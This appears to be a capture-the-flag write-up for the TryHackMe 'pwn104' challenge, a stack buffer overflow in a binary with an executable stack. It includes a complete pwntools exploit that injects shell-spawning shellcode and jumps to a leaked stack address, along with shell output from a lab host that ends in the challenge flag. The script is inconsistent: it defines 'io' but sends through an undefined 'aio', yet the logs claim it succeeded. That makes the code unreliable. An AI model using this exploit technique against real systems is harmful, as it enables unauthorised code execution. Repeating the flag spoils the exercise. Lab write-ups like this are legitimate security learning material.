# pwn104

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/tmp]
└─$ file pwn104-1644300377109.pwn104
pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/tmp]
└─$ checksec pwn104-1644300377109.pwn104
[*] '/mnt/c/Users/hzqzz/Downloads/tmp/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

running the file

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/tmp]
└─$ ./pwn104-1644300377109.pwn104
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fffec093610
```

the source code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  setup(argc, argv, envp);
  banner();
  puts(aIThinkIHaveSom);
  puts(aEspeciallyExec);
  puts(aCanWeGoForAFig);
  printf("I'm waiting for you at %p\n", buf);
  return read(0, buf, 0xC8uLL);
}c
```

based on the source code and output when running, I think we just need to overflow than ret2 the address given in the output. Finding the offset and we got 88

```bash
pwndbg> cyclic -l laaaaaaa
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```

I used shellcraft's shellcode to get shell

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Load the ELF binary
elf = ELF("./pwn104-1644300377109.pwn104", checksec=False)
context.binary = elf

# Remote target
HOST = args.HOST or "10.10.30.222"
PORT = int(args.PORT or 9004)

# Select local or remote connection
if args.LOCAL:
    io = process(elf.path)
else:
    io = remote(HOST, PORT)

# Optional GDB attach
if args.GDB and args.LOCAL:
    gdb.attach(io, gdbscript='continue')

#───────────────────────────────────────────────────────────────────────────────
# 1. Receive prompt and parse dynamic address
prompt = b"I'm waiting for you at 0x"
io.recvuntil(prompt)
addr = io.recvline().strip()            # e.g. b'7ffe8ef8b280'
target_addr = int(addr, 16)
log.info(f"Parsed target address: 0x{target_addr:x}")

# 2. Prepare payload
offset = 88
shellcode = asm(shellcraft.sh())
padding = b'A' * (offset - len(shellcode))

# 3. Build the payload
payload = flat([
    shellcode,
    padding,
    p64(target_addr)
])

# 4. Send payload
aio.sendline(payload)

# 5. Interact (get shell)
aio.interactive()

```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/tmp]
└─$ python ret2win.py LOCAL
[+] Starting local process '/mnt/c/Users/hzqzz/Downloads/tmp/pwn104-1644300377109.pwn104': pid 3050
[*] Parsed target address: 0x7ffc85e0c9c0
[*] Switching to interactive mode
$ whoami
zeqzoq
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/tmp]
└─$ python ret2win.py
[+] Opening connection to 10.10.30.222 on port 9004: Done
[*] Parsed target address: 0x7ffecd0e8910
[*] Switching to interactive mode
$ whoami
pwn104
$ ls
flag.txt
pwn104
pwn104.c
$ cat flag.txt
THM{0h_n0o0o0o_h0w_Y0u_Won??}
```
